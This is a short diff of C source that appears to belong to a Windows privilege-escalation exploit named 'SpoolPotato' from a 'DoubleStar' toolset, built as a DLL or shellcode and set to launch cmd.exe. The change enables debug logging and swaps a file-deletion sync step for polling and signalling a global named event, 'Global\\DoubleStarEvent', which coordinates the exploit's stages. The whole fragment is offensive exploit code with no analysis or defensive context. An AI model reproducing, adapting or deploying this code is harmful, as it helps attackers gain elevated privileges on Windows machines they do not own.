@@ -16,14 +16,13 @@
 // Global settings
 ////////
 
-//#define DEBUG
+#define DEBUG
 //#define EXE_BUILD
 #define DLL_BUILD
 #define SHELLCODE_BUILD
 //#define SESSION_ID 1
 #define COMMAND_LINE L"cmd.exe"
 #define INTERACTIVE_PROCESS FALSE
-#define SYNC_FILE L"C:\\ProgramData\\DoubleStarSync\\DoubleStarSync"
 
 ////////
 ////////
@@ -366,9 +365,14 @@ BOOL SpoolPotato() {
                     4. Terminates itself.
                     */
 
-                    while (!DeleteFileW(SYNC_FILE)) {
+                    HANDLE hEvent;
+                    
+                    while((hEvent = OpenEventW(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, L"Global\\DoubleStarEvent")) == NULL) {
                         Sleep(500);
                     }
+
+                    SetEvent(hEvent);
+                    CloseHandle(hEvent);
 #ifdef DEBUG
                     DebugLog(L"... successfully synced WPAD client event file and deleted it");
 #endif
